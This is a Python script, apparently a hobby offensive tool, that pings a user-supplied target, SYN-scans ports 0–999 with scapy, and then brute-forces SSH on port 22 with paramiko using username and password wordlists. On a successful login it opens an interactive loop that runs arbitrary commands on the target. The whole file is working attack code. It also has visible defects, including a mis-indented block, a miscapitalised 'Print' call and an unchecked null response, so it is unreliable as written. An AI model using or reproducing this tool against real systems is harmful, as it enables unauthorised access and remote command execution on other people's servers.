import random
import paramiko
import os
from scapy.all import *
from scapy.layers.inet import TCP, IP, sr1, ICMP


Registered_ports=range(1,1023)
Open_Ports=[]
Port22 = False
TargetFlaga = False




def BruteForce(atak_port):

    authenticated=False
    cmd=""

    SSHconn=paramiko.SSHClient()
    SSHconn.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(r"users.txt", "r") as users_plik:
        users=users_plik.read().split('\n')
    with open(r"passwords.txt", "r") as passwords_plik:
        passwords=passwords_plik.read().split('\n')

    for user in users:
        for password in passwords:
            try:
                print("[DEBUG] username:{}, password:{}".format(user,password))
                SSHconn.connect(hostname=target, username=user,password=password,timeout=1,port=atak_port)
                print(" -------------------------------------------------------------------")
                print("[+] Login succed with user: {} and password: {}".format(user,password))
                print(" -------------------------------------------------------------------")
                while True:
                    cmd=input("Choose a command to execute in the system or exit: ")
                    if cmd == "exit":
                        SSHconn.close()
                        exit(0)
                    else:
                        std_in, std_out, std_err = SSHconn.exec_command(cmd)
                        authenticated = True
                        print("Command Execute:\n{} \nErrors:\n{}\n".format(std_out.read().decode(),std_err.read().decode()))
            except paramiko.ssh_exception.AuthenticationException as error:
                print(f"login:{user} and password:{password} failed")

def ScanPort(atak_port):
    global Port22
    src_port = RandShort()
    conf.verb = 0
    response = sr1(IP(dst=target)/TCP(sport=src_port,dport=atak_port,flags="S"),timeout=0.5,verbose=0)
    if(response.haslayer(TCP)):
        if(response.getlayer(TCP).flags == 0x12):
            close_connection = sr(IP(dst=target)/TCP(sport=src_port,dport=atak_port,flags='R'),timeout=2, verbose=0)
            print(f" port {atak_port} is open.")
            if atak_port==22:
                Port22=True
            

def TargetCheck(target):
    global TargetFlaga
    response = ""
    response = sr1(IP(dst = target)/ICMP(),timeout = 3)
        if(response !=""):
            TargetFlaga = True



target = input("Please specify a target: ")
#10.0.0.122
#192.168.80.133
TargetCheck(target)

if TargetFlaga:
    Print("IP jest ok")
    for destination_port in range(0, 1000):
        ScanPort(destination_port)

    if Port22==True:
        attack=input("brute-force attack on that port 22 ? (y/n): ")
        if attack=="y":
            BruteForce(22)
        else:
            exit(0)